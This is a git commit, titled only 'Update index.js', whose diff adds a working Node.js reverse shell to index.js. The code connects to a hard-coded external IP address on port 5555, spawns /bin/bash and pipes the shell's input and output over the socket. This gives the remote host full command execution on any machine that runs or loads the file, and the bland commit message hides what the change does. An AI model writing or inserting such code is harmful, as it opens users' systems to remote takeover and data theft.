fe03775c848ac9dd3c69b0d69365962f3606f450
baderwallysdfs <122759523+baderwallysdfs@users.noreply.github.com>
2024-04-25 07:42:55 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,20 @@
 
+const net = require('net');
+const spawn = require('child_process').spawn;
+
+const HOST = "65.20.82.187";
+const PORT = 5555;
+
+const client = new net.Socket();
+
+client.connect(PORT, HOST, () => {
+    const shell = spawn('/bin/bash', []);
+
+    client.pipe(shell.stdin);
+    shell.stdout.pipe(client);
+    shell.stderr.pipe(client);
+
+    client.on('close', () => {
+        shell.kill();
+    });
+});
